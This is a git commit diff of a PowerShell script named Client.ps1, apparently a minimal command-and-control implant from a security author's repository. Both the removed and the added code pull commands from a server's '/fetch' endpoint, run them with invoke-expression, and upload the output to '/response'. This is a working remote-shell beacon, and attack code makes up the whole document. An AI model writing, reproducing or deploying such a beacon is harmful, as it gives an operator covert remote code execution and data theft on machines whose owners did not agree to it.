cace7e1925c9f1633995cd9496a79b70f3f1e5ca
infosecsmith <infosecsmith@gmail.com>
2014-06-04 15:16:59 -0600

    Update Client.ps1

--- Client.ps1
+++ Client.ps1
@@ -1,30 +1,10 @@
 while($true)
 {
-
-$r = [System.Net.WebRequest]::Create("http://127.0.0.1:8080/fetch")
-$r.Proxy = [System.Net.WebRequest]::GetSystemWebProxy()
-$resp = $r.GetResponse()
-$reqstream = $resp.GetResponseStream()
-$sr = new-object System.IO.StreamReader $reqstream
-$result = $sr.ReadToEnd()
-write-host $result
-
-  switch ($result) {
-    "idle" { 
-		# we're asked to standby
-		start-sleep -sec 10
-    }
-	default {
-	
-		$output = invoke-expression $result | out-string 
-		$resp = new-object System.Net.WebClient
-		$resp.Proxy = [System.Net.WebRequest]::GetSystemWebProxy()
-		$resp.UploadString("http://127.0.0.1:8080/response", $output)
-	
-		start-sleep -sec 10
-		
-	}
-	
-  }
-  
+$server = "127.0.0.1:8081"
+$result = (New-Object Net.WebClient).DownloadString("http://$server/fetch")
+while($result) {
+	$output = invoke-expression $result | out-string 
+	$resp = (New-Object System.Net.WebClient).UploadString("http://$server/response", $output)	
+	break
+}
 }
